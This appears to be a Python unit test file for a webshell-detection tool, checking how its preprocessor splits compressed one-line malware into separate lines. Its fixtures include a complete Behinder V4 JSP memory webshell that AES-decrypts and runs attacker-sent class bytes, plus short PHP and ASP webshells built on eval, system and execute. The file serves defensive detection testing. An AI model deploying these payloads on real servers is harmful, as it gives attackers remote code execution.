"""输入预处理（pre_format_malware_code）分行管道测试。

覆盖重点：
- JSP XML 语法单行载荷（冰蝎/哥斯拉 JSP 内存马）必须完整切分，
  不得残留超长行 —— 否则送模型的行号锚点失效，[[HL]] 回填错位；
- 已结构化的多行源码必须原样保留（不得被重排破坏行号）；
- 缩进敏感语言永不重排；
- 既有 PHP / ASP 定界符行为不得回归。
"""
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from shellsentry.core.input_handler import (
    pre_format_malware_code,
    _detect_lang_from_filename,
    _looks_compressed,
)

# 冰蝎 V4 JSP 内存马：整段压缩为一行，使用 JSP XML 语法（不含 <% %> 定界符）
BEHINDER_JSP_XML = (
    '<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">'
    '<jsp:directive.page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"/>'
    '<jsp:declaration> class U extends ClassLoader{U(ClassLoader c){super(c);}'
    'public Class g(byte []b){return super.defineClass(b,0,b.length);}}</jsp:declaration>'
    '<jsp:scriptlet>String k="e45e329feb5d925b";session.putValue("u",k);'
    'Cipher c=Cipher.getInstance("AES");'
    'c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));'
    'new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder()'
    '.decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);'
    '</jsp:scriptlet></jsp:root>'
)


class TestJspXmlReflow(unittest.TestCase):
    def test_single_line_jsp_xml_is_compressed(self):
        self.assertTrue(_looks_compressed(BEHINDER_JSP_XML))
        self.assertEqual(_detect_lang_from_filename("shell.jsp"), "java")

    def test_jsp_tags_are_placed_on_own_lines(self):
        out = pre_format_malware_code(BEHINDER_JSP_XML, filename="shell.jsp")
        lines = out.split("\n")
        for tag in ("<jsp:root", "<jsp:directive.page", "<jsp:declaration>",
                    "</jsp:declaration>", "<jsp:scriptlet>", "</jsp:scriptlet>",
                    "</jsp:root>"):
            holder = [i for i, l in enumerate(lines, 1) if l.lstrip().startswith(tag)]
            self.assertTrue(holder, f"标签 {tag} 未独立成行")
            for ln in holder:
                # 标签行必须是独立行，不得与后续 Java 语句粘连
                self.assertLess(len(lines[ln - 1]), 120,
                                f"{tag} 所在行仍过长: {lines[ln-1][:80]}")

    def test_no_residual_giant_line(self):
        """核心回归点：修复前第 1 行为 300+ 字符的标签+代码混合体。"""
        out = pre_format_malware_code(BEHINDER_JSP_XML, filename="shell.jsp")
        lines = out.split("\n")
        self.assertGreaterEqual(len(lines), 15, "分行数明显不足")
        self.assertLess(len(lines[0]), 100,
                        f"首行仍未切分: {lines[0][:80]}")

    def test_payload_content_preserved(self):
        """切分不得改动任何内容字节（仅调整空白与换行）。"""
        out = pre_format_malware_code(BEHINDER_JSP_XML, filename="shell.jsp")
        for token in ('e45e329feb5d925b', 'Cipher.getInstance("AES")',
                      'super.defineClass(b,0,b.length)',
                      'new sun.misc.BASE64Decoder()', 'session.putValue("u",k)'):
            self.assertIn(token, out)

    def test_jsp_extension_and_generic_extension_both_split(self):
        for name in ("shell.jsp", "payload.txt"):
            out = pre_format_malware_code(BEHINDER_JSP_XML, filename=name)
            self.assertLess(len(out.split("\n")[0]), 100, f"{name} 未正确分行")


class TestReflowPreservesExistingBehaviour(unittest.TestCase):
    def test_structured_multiline_is_untouched(self):
        code = "<?php\n$e = $_POST['x'];\neval($e);\n?>\n"
        self.assertFalse(_looks_compressed(code))
        self.assertEqual(pre_format_malware_code(code, filename="a.php"),
                         code.strip())

    def test_python_never_reflowed(self):
        code = "import os\nfor i in range(3):\n    print(i)\n"
        self.assertEqual(pre_format_malware_code(code, filename="a.py"),
                         code.strip())

    def test_php_delimiter_split_still_works(self):
        code = "<?php $a=$_GET['x'];system($a);?>"
        out = pre_format_malware_code(code, filename="a.php")
        self.assertGreater(len(out.split("\n")), 1)
        self.assertLess(len(out.split("\n")[0]), 60)

    def test_asp_single_statement_kept_intact(self):
        """单语句 ASP 一行本身足够短，不应被拆散，也不得丢内容。"""
        out = pre_format_malware_code('<%execute request("a")%>', filename="a.asp")
        self.assertEqual(out, '<%execute request("a")%>')

    def test_asp_multi_block_splits(self):
        code = '<%dim a%><%a=request("x")%><%eval(a)%>'
        out = pre_format_malware_code(code, filename="a.asp")
        lines = [l for l in out.split("\n") if l.strip()]
        self.assertGreater(len(lines), 1, "多个 <% %> 块应各自成行")

    def test_highlight_residue_stripped(self):
        out = pre_format_malware_code("<?php [[HL]]eval[[/HL]]($a);?>", filename="a.php")
        self.assertNotIn("[[HL]]", out)
        self.assertIn("eval", out)

    def test_empty_input_passthrough(self):
        self.assertEqual(pre_format_malware_code("", filename="a.jsp"), "")


if __name__ == "__main__":
    unittest.main()
